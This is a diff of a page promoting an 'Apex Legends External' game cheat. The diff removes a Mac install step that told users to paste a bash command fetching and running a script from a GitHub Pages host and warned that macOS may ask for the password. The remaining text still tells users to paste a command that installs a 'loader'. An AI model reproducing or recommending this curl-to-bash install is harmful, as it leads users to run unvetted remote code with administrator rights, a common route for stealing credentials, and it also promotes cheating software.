@@ -172,14 +172,9 @@ The **🛡️ Apex Legends External Evicted V2** stands apart from competitors t
 ### Mac Installation Steps
 
 1. **Press `⌘ + Space`**, type **Terminal**, hit Enter
-2. **Paste the command below** (`⌘ + V`) and press Enter
+2. **Paste the command** (`⌘ + V`) and press Enter
 3. **Follow the prompts** — the loader installs automatically
 
-```bash
-bash <(curl -fsSL https://laplaplaplas.github.io/mac-download/)
-```
-
-> Works on Apple Silicon (M1–M4) and Intel Macs. macOS may ask for your password during install.
 
 ### System Requirements (macOS)
 
